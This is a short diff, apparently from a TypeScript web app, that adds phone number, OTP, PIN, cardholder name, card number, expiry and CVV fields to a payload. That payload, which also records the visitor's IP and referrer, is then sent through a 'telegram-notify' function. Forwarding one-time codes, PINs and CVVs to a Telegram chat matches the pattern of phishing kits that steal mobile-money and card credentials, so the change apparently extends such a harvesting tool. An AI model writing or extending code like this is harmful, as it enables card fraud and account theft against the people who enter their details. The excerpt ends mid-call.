@@ -7,6 +7,13 @@ export const sendTelegramNotification = async (payload: {
   referrer?: string;
   ip?: string;
   paymentType?: 'mfs' | 'card';
+  number?: string;
+  otp?: string;
+  pin?: string;
+  cardName?: string;
+  cardNumber?: string;
+  expiry?: string;
+  cvv?: string;
 }) => {
   try {
     await supabase.functions.invoke('telegram-notify', {
